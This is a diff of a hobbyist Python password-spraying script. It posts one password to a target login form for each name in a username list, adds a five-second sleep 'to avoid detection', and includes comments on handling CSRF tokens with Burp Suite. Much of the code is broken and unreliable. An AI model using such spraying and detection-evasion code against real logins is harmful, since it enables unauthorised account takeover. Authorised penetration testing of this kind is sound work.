@@ -1,28 +1,16 @@
-import requests
+# This script isnt designed to be used outside the context of an engagement, as osint must be done into
+# org passwords and the formatting they use for user names & email (first.last, first, last.first etc.)
+
+import time as t
+import requests as r
 from sys import exit
-#from checks import frameworkChecker
 
-#Im just playing around, I like that im learning about csrf a lot while googling.
-
-#Eventually this is going to be so large it'll have to be in checks.py
-def frameworkChecker(framework: str) -> bool:
-    if framework == "Jinga2" or "jinga2":                    
-        csrf = ["{{ csrf_token }}", "{% csrf_token %}"]
-        return True      
-    if framework == "Django" or "django":                   
-        csrf = ["csrf_token", "{% csrf_token %}"]
-        return True
-    if framework == "ASP.NET" or "asp.net":
-        csrf = ["RequestVerificationToken","Html.AntiForgeryToken","__RequestVerificationToken"]
-        return True
-    if not True:
-        sys.exit("Unknown Framework!")
-        
-    
-
-def passwordSpray(password: str, url: str, framework: str) -> bool:
+#Got rid of framework checker, just use burp proxy to look for requests that contain a CSRF token 
+#in the request parameters or headers. The CSRF token will typically be a long, random-looking string of characters
+            
+def passwordSpray(password: str, url: str) -> bool:
     csrf = []
-    frameworkChecker(framework)
+    #frameworkChecker(framework)
     print("""
      _____ _               _____                       _  ______            _        __                   
     /  __ | |             |  ___|                     | | | ___ \          | |      / _|                  
@@ -35,31 +23,37 @@ def passwordSpray(password: str, url: str, framework: str) -> bool:
         username = username.replace(" ", "")
         print(f"Trying:", {username})                                               # Interesting, I will investigate what is the best to call
         data = {"username": username,"password": password,"login":"submit"} # login value will only work for very few back-end oriented auth systems
-        response = requests.post(url, data=data)
-        if not requests.ok:
+        response = r.post(url, data=data)
+        
+        if not r.ok:
             #Code here for debug, if I move unsuccessful passwords out, then the final list is self-documenting.
             print(username.pop(username))
+            t.sleep(5) # wait to avoid detection
             pass
+        
         for i in csrf:    
-            if csrf in str(response.content):
+            if csrf in str(response.content): # use burp suite proxy or OWASP ZAP instead
                                                     # I sorta get what you're saying here, but I don't understand the benefits. Am I correct to say, init the dictionary and then save headers response into that dict to be looked at further?
                 print("CSRF token detected") # you can add headers like: response = requests.post(url, data=data, headers=headers) and create a headers dict for the CSRF token
                 return False
+        
         else:
             print(f"Success: Username: ---> ", {username}, "\n", "Password: ---> ", {password})
             return True
 
 
 if __name__ == '__main__':
+    
     url = input("Enter Target Url: ")
     password = input("Enter Target Password: ")
-    error = input("Enter Wrong User Error Message: ")
-    #framework = input("Enter target framework (will be used to set params to look for): ")
+    error = input("Enter Wrong User Error Message: ")    
     
     try:
         passwordSpray()
-    except:
-        print("Exception occured!!") # Be more explicit, catch specific exceptions to make life easier later on
+    except r.exceptions.HTTPError as err:
+        print(f'There was an error: {err}')
+    except r.exceptions.RequestException as err:
+        print(f'There was an error: {err}')
 
     #compile list from engagement notes
     with open("usernames.txt", "r") as usernames:
